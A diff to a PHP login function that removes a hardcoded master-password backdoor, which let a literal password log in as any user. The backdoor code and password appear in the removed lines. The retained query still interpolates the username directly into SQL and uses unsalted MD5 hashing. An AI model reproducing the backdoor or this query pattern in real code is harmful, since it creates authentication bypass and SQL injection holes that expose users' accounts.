@@ -346,12 +346,7 @@
 
     function get_checklogin_user_info ($conn,$username,$password) {
         $mypassword = md5($password);
-        // Master Password
-        if ($password == 'Picoton77') {
-            $sql="SELECT * FROM users WHERE nickname='$username'";
-        } else {
-            $sql="SELECT * FROM users WHERE nickname='$username' and password='$mypassword'";
-        }
+        $sql="SELECT * FROM users WHERE nickname='$username' and password='$mypassword'";
 
         $result=mysqli_query($conn,$sql);
         while ($row = mysqli_fetch_assoc($result)) {
